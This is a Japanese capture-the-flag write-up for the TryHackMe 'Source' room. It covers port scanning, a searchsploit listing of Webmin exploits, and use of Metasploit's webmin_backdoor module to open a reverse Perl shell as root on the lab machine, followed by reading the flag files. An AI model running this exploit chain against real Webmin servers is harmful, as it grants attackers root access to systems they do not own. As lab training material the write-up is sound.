# Source CTF

https://tryhackme.com/room/source

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.53.203
root@ip-10-10-21-42:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-07 06:11 GMT
Nmap scan report for 10.10.53.203
Host is up (0.00075s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
MAC Address: 02:56:28:1A:07:77 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.00 seconds
root@ip-10-10-21-42:~# sudo nmap -sV -p22,10000 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-07 06:11 GMT
Nmap scan report for 10.10.53.203
Host is up (0.00020s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
MAC Address: 02:56:28:1A:07:77 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.43 seconds
```

MiniServ 1.890 (Webmin httpd)

10000 ポートをブラウザ表示するとエラー表示。

```text
Error - Document follows

This web server is running in SSL mode. Try the URL https://ip-10-10-53-203.eu-west-1.compute.internal:10000/ instead.
```

### gobuster

```shell
gobuster dir -x=txt,php -u http://$TARGET:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
```

エラー多数で何も出ない。

```shell
$ searchsploit Webmin
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                   | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                  | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                              | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                          | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                 | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                       | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                           | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                      | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)             | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                           | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                              | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)            | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                              | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                 | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                   | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                        | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                  | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                              | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)                        | linux/webapps/50998.py
Webmin 1.x - HTML Email Command Execution                                         | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                      | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                      | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                     | linux/webapps/47330.rb
---------------------------------------------------------------------------------- ---------------------------------
```

1.890 < 1.920 なので、RCE がありそうに見える。

## Metasploit

認証が必要なものと不要なものがある。もちろん不要なものを選択。

```shell
msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.53.203
RHOSTS => 10.10.53.203
msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/http/webmin_backdoor) > exploit

[*] Started reverse TCP handler on 10.2.22.182:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Please enable the SSL option to proceed
[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
```

エラー。SSL を true にして再実行。

```shell
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_backdoor) > exploit

[*] Started reverse TCP handler on 10.2.22.182:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.2.22.182:4444 -> 10.10.53.203:52582) at 2025-03-07 01:26:32 -0500

whoami
root
```

まさかのいきなり root ユーザー。

```shell
cat /home/dark/user.txt
THM{.............}
```

```shell
cat /root/root.txt
THM{.............}
```

ゲームセット。

## 振り返り

- metasploit の練習には良い。
- 何故いきなり root になったのか？

→ root で miniserv.pl を実行していたから

```shell
ps -ef | grep miniserv
root      1195     1  0 06:10 ?        00:00:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
root      1903  1816  0 06:36 ?        00:00:00 sh -c ps -ef | grep miniserv
root      1905  1903  0 06:36 ?        00:00:00 grep miniserv
```
